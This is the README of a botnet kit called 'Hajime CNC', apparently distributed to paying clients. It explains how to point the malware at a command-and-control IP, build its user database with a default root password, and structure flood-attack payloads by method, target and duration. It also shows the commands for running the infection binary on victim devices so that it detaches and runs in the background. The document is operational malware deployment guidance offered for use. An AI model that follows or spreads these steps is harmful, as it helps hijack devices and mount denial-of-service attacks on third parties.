# Hajime CNC - [@FB](https://t.me/FB_1234)

**Hajime CNC** is a high purpose custom malware strain wrote by FB for skies and cluber

`The files you currently have here are outdated. I have sent you the outdated ones for now while I finish a few smaller tasks that are currently unstable.`

## Setup

The configuration process is considerably more straightforward than the previous version of malware you've utilized. It's necessary to modify the IP in malware/malware.go at line 67. If you've altered your bot port, you should also adjust the port there.

To confirm the installation of Golang on your system, execute the command below:

```bash
go version
```

Should Go be installed correctly, the expected output will be:

```bash
go version go[version] [os]/[arch]
```

To verify the installation of SQLite, please execute the subsequent command::

```bash
sqlite3 --version
```

Should SQLite be installed correctly, the expected output will be:

```bash
[version] [release_date] [release_time] [checksum]
```

Following the successful verification of both components, you are now prepared to advance with the installation procedure. A bash script has been provided to assist you in setting up the SQLite database and compiling all required binaries.

## Hajime DB

**Hajime CNC** uses SQLite to retain information about its users, attacks, and logins. Within your **Hajime CNC** folder, you should have noticed the `hajime-v1.sql` file. This file contains the basic table schema and the **root** user. Run this command to create the database by using the `hajime-v1.sql` file.

```bash
sqlite3 resources/database.sql < hajime-v1.sql
```

After executing this command, a new file will appear inside your `resources` directory. This file is your database file and must be kept **private** at all times.

The password for the **root** user by default is `hajime132`.

During your usage of **Hajime CNC**, you have the option to delete the `resources/database.sql` file at any time and recreate it using the same command.

## Branding - Powered by TinyKaboom

**TinyKaboom**, crafted by FB in Golang, is a powerful template engine. It empowers users to embed functions and variables directly into their template code and *execute them during runtime*. Notably, it surpasses the performance of its predecessor, *Kaboom*, and even outperforms the *TermFX* library.

### Branding Objects

If you choose not to add any extra branding objects (**TinyKaboom objects**), you'll be able to follow the terms listed below!

```tinyKaboom
<<$name>>
<<$online>>
<<user.$id>>
<<user.$username>>
<<user.$admin>>
<<user.$parent>>
```

## Malware

The Hajime Malware, crafted in Golang, incorporates various strategies to guarantee complete infiltration of devices.

The entirety of your malware code is located within the `malware` directory, with the main function housed in the `malware.go` file.

### Payloads

Hajime's payloads are fine-tuned for minimal size while still maintaining the same data capacity.`

#### Attacks

The attacks employ a simple strategy that is straightforward to assemble and disassemble on the client side.

1. The initial 4 bytes specify the method employed for the flood.
2. The following 4 bytes denote the length of the target.
3. The subsequent group of bytes, with a size equal to the previous 4 bytes' value, pinpoint the attack's target.
4. The next 4 bytes dictate the attack's duration.

    This is a sample of a constructed payload with annotated data.

    ```md
    [METHOD_ID][METHOD_TARGET_LENGTH][METHOD_TARGET][METHOD_DURATION]
    [METHOD_ID] represents the flood method, [METHOD_TARGET_LENGTH] denotes the length of the target, [METHOD_TARGET] identifies the target of the attack (size corresponds to the value of METHOD_TARGET_LENGTH), and [METHOD_DURATION] specifies the duration of the attack.
    ```

5. any bytes which occur from this point will follow a new format
    1. The initial 4 bytes denote the flag's ID.
    2. The following 4 bytes specify the length of the flag's value.
    3. The next series of bytes, matching in size to the value of the last 4 bytes, represent the actual value of the flag.

### Infection

Every time you infect a device, a flag must be included that signifies the device's architecture. If this flag is left empty or filled with a full stop, the system will automatically identify the device's architecture. In the absence of a second flag, the binary triggers a child process, severing its link to the admin process, allowing it to operate in the background.

Illustration of execution in the background without a designated architecture.

```bash
./binary .
```

Illustration of operating in the background with a specified architecture.

```bash
./binary x86
```

Example of designating the architecture without running the process in the background.

```bash
./binary x86 n
```

Example of defining the architecture and running the process in debug mode, without having it operate in the background.

```bash
./binary x86 debug
```

As observed from the above, the syntax adheres to a basic rule: it specifies an architecture and then a flag to denote the mode. Absence of a flag implies the process will run in the background.
